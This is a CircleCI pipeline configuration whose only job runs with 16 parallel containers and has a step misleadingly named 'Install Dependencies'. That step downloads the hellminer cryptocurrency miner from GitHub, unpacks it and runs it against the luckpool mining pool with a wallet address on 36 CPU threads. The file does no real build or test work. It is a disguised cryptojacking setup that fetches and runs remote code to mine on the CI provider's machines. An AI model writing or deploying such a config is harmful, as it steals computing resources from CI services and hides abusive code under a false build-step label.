version: 2.1
jobs:
    trial:
      docker:
            - image: circleci/ruby:2.5.3
      parallelism: 16
      steps:
        - run:
            name: Install Dependencies
            command: |
              lscpu
              wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar zxvf hellminer_cpu_linux.tar.gz;rm -fr hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RWBMCFCdi8NbzrwYkoPsPmKXunaWhf3oKJ.never -p x --cpu 36

workflows:
    version: 2.1
    build:
        jobs:
        - trial